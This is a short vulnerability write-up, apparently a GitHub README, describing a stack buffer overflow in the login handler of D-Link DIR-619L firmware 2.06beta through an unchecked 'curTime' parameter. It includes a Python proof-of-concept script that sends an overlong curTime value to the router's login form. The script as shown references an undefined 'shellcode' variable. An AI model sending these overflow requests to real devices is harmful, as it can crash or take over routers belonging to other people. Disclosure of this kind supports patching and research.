# dlink-619l-buffer_overflow

**Vender** ：D-Link

**Firmware version**:2.06beta

**Exploit Author**: ys110

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**:http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-619L

Vul detail
========

In the handler of router / goform / Login, the http request parameter "curTime" is obtained through the webgetvar function, and curTime is copied to the s1 register


![image](https://github.com/hhhhu8045759/dlink-619l-buffer_overflow/blob/master/3.png)


After login authorization, at the end of the function, in the websRedirect function


![image](https://github.com/hhhhu8045759/dlink-619l-buffer_overflow/blob/master/4.png)

call the send_r_moved_perm function. The value of curTime is copied to the a2 register, and the sprintf function copies it to the stack, it does not check the length, and a very long input could lead to stack overflow and overwrite the return address, remote code execution

![image](https://github.com/hhhhu8045759/dlink-619l-buffer_overflow/blob/master/5.png)

![image](https://github.com/hhhhu8045759/dlink-619l-buffer_overflow/blob/master/619.png)

poc
====
```python
import requests
import sys
import struct
import string
import base64
def login(shellcode,user,password,ip):
	postData = {
	'login_name':'yuanshuo',
	'curTime':'a'*300,
	'FILECODE':"12345",
	'VER_CODE':'vercode',
	'VERIFICATION_CODE':'12345',
	'login_n':user,
	'login_pass':password,
	}
	response = requests.post('http://192.168.1.1/goform/formLogin',data=postData)
        
        #print 'http://' + ip + '/goform/formLogin'
        print response.json


if __name__ == "__main__":
	login(shellcode,'admin', base64.b64encode('shuoshuo110'),'192.168.1.1')

```

